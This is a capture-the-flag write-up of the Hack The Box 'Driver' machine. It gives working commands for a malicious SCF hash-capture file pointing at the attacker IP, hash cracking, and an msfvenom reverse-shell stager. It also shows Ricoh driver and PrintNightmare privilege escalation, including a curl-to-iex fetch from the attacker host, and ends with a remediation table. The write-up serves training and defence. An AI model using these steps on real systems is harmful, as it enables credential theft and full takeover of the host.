# Driver — A malicious SCF, a Ricoh printer driver, and SYSTEM

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/driver)
[![OS](https://img.shields.io/badge/OS-Windows-blue)](https://app.hackthebox.com/machines/driver)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=N2ahkarb-zI)

> **Attack path:** Default `admin:admin` on the "MFP Firmware Update Center" site grants access to a firmware-upload form that drops files on an SMB share → upload a malicious `.scf` file → an admin browses the share in Explorer and leaks their Net-NTLMv2 hash to Responder → crack it (`tony:liltony`) → WinRM shell → Ricoh printer driver DLL hijack (CVE-2019-19363) or PrintNightmare (CVE-2021-1675) → SYSTEM.

## 1 · Reconnaissance

### Port scanning

```
# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.106
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

# nmap -p 80,135,445,5985 -sCV -oA scans/nmap-tcpscripts 10.10.11.106
80/tcp   open  http  Microsoft IIS httpd 10.0
| http-auth: HTTP/1.1 401 Unauthorized
|_ Basic realm=MFP Firmware Update Center. Please enter password for admin
445/tcp  open  microsoft-ds Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http  Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

WinRM (5985) open means any credentials harvested for a user in the
Remote Management group convert directly into a shell. SMB requires
authentication (`smbclient -N -L` is denied), so start with the web page.

### The website

Port 80 returns `401 Unauthorized` with HTTP Basic auth. The realm
string leaks the username:

```
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
```

Guessing the classic default `admin : admin` works (the header is just
`base64("admin:admin")` = `YWRtaW46YWRtaW4=`).

The site is a Ricoh-style "MFP Firmware Update Center" (IIS 10.0 with
PHP 7.3.25). The "Firmware Updates" page (`fw_up.php`) offers a form:
select a printer ("HTB Ecotank") and upload a firmware file. Burp shows
a multipart POST — and the page states uploads land on the company
**file share**, not the webroot, so a webshell is pointless.

## 2 · Foothold

### SCF file capture attack

With write access to a share that humans browse in Explorer, the classic
move is a Windows Shell Command file whose icon points at the attacker.
When Explorer renders the folder, it fetches the icon over SMB and
authenticates with the browsing user's Net-NTLMv2. Create `0xdf.scf`:

```
[Shell]
Command=2
IconFile=\\10.10.14.6\evil.exe,3
```

(`10.10.14.6` is the attacker VPN IP.) Start Responder and upload the
file through the firmware form:

```
# sudo responder -I tun0
...[snip]...
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:29baae537d2b9cd1:ef8cb94a1687bd65cc08365062029b8c:...
```

### Crack the hash and connect over WinRM

Net-NTLMv2 is hashcat mode 5600:

```
# hashcat tony.hash -m 5600 /usr/share/wordlists/rockyou.txt
tony::DRIVER:...:liltony

# crackmapexec winrm 10.10.11.106 -u tony -p liltony
WINRM  10.10.11.106  5985  [+] None\tony:liltony (Pwn3d!)

# evil-winrm -i 10.10.11.106 -u tony -p liltony
*Evil-WinRM* PS C:\Users\tony\Documents>
```

## 3 · User flag

```
*Evil-WinRM* PS C:\Users\tony\Desktop> cat user.txt
<flag>
```

## 4 · Privilege escalation

### Find the printer driver

Check PowerShell history for hints:

```
*Evil-WinRM* PS C:\> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
```

That Ricoh driver is the intended target — CVE-2019-19363: the driver's
DLL folder is writable by everyone:

```
*Evil-WinRM* PS C:\programdata\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23\_common\dlz> icacls *.dll
headerfooter.dll Everyone:(F)
jobhook.dll Everyone:(F)
...
```

When the driver loads (e.g. when a printer is used/added), these DLLs
execute as SYSTEM — so replacing one gives privilege escalation.

### Method 1: Ricoh driver privesc (Metasploit)

There is no clean public non-Metasploit PoC, so generate a meterpreter
stager, run it, then use the module:

```
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe -o rev.exe
```

Upload `rev.exe` via Evil-WinRM (`upload rev.exe`), start
`exploit/multi/handler`, execute it on target, then:

```
msf6> use exploit/windows/local/ricoh_driver_privesc
msf6> set session 1
msf6> run
[+] The target appears to be vulnerable. Ricoh driver directory has full permissions
[*] Meterpreter session 2 opened ...
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Caveat: the module hangs if the meterpreter process is in session 0 —
migrate into an interactive-session process first:

```
meterpreter > migrate -N explorer.exe
```

### Method 2: PrintNightmare (CVE-2021-1675)

The box is also vulnerable to PrintNightmare, which needs nothing but
the tony shell. Grab `Invoke-Nightmare`, bypass execution policy by
loading it over HTTP, and let it add a local administrator:

```
# git clone https://github.com/calebstewart/CVE-2021-1675
# cd CVE-2021-1675 && python3 -m http.server 80
```

```
*Evil-WinRM* PS C:\programdata> curl 10.10.14.6/CVE-2021-1675.ps1 -UseBasicParsing | iex
*Evil-WinRM* PS C:\programdata> Invoke-Nightmare -NewUser "0xdf" -NewPassword "0xdf0xdf"
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_...\Amd64\mxdwdrv.dll"
[+] added user 0xdf as local administrator
```

## 5 · Root flag / Domain Admin

With either method:

```
meterpreter > cat /users/administrator/desktop/root.txt    # as SYSTEM
<flag>
```

or with the PrintNightmare admin account:

```
# evil-winrm -i 10.10.11.106 -u 0xdf -p 0xdf0xdf
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| Default credentials `admin:admin` on the firmware center | Full access to the upload facility | Enforce strong, unique passwords; add lockout and MFA for admin interfaces |
| Unauthenticated-ish write to a browsed file share | SCF/icon capture leaks Net-NTLMv2 of any user viewing the share | Restrict share permissions; disable SMB icon/preview rendering (disable the Shell icon handler); enable SMB signing is not enough — treat NTLM relay/capture risk |
| Weak, crackable user password (`liltony` in rockyou) | Offline crack of one capture = WinRM foothold | Long passphrases; filtered/admin accounts excluded from interactive share browsing |
| Ricoh PCL6 driver folder writable by Everyone (CVE-2019-19363) | DLL execution as SYSTEM | Update/replace the Ricoh driver; correct ACLs on `C:\programdata\RICOH_DRV` |
| Unpatched Spooler (PrintNightmare, CVE-2021-1675) | Any user adds a local administrator | Apply 2021-06 security updates; disable the Print Spooler service on non-print servers; RestrictDriverInstallationToAdministrators |

## 7 · CPTS takeaways

- Read HTTP `WWW-Authenticate` realms carefully — they often disclose usernames; default credential guessing is step zero after any login prompt.
- Any share-writable + human-browsed scenario means SCF/`.url` icon capture with Responder; know hashcat mode 5600 (Net-NTLMv2) and the rockyou workflow by heart.
- Validate cracked credentials with `crackmapexec winrm/smb` before burning time on a shell; on 5985, `evil-winrm` is the standard client.
- Windows privesc starts with history and installed software enumeration: PowerShell console history, `Get-WmiObject Win32_Printer`, driver folders under `C:\programdata` with `icacls` — `Everyone:(F)` on a DLL loaded by SYSTEM is an instant win.
- PrintNightmare deserves a permanent slot in your notes: it works on countless unpatched Windows hosts, needs only a low-priv shell, and both the MSF module and `Invoke-Nightmare` are exam-speed options.
